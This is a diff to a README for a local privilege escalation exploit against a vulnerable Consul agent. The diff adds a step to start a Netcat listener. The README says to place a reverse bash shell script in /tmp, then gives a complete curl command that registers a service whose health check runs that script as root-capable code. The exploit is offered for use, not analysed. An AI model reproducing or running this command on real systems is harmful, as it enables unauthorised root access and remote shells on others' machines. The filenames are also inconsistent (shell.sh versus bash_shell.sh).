@@ -5,9 +5,11 @@ Shell command that can be run locally to perform privilege escalation on a vulne
 
 # How-To: 
 
-1.There is a shell.sh file included that contains a reverse bash shell that can be modified, or, replace the command all together with your own. Place or create your own shell.sh in (recomended) /tmp directory. 
+1.There is a shell.sh file included that contains a reverse bash shell that can be modified, or, replace the command all together with your own. Place or create your own shell.sh in (recomended) /tmp directory.
 
-2. Run the following command:
+2. Set up a listener (Netcat) if using a reverse shell.
+
+3. Run the following command:
 
 curl --header "X-Consul-Token: #<REPLACE_WITH_YOUR_ACL_TOKEN_HERE>#" --request PUT -d '{"ID": "LPE", "Name": "LPE", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/bin/bash", "/tmp/bash_shell.sh"], "interval": "30s", "timeout": "100000s"}}' http://127.0.0.1:8500/v1/agent/service/register
 
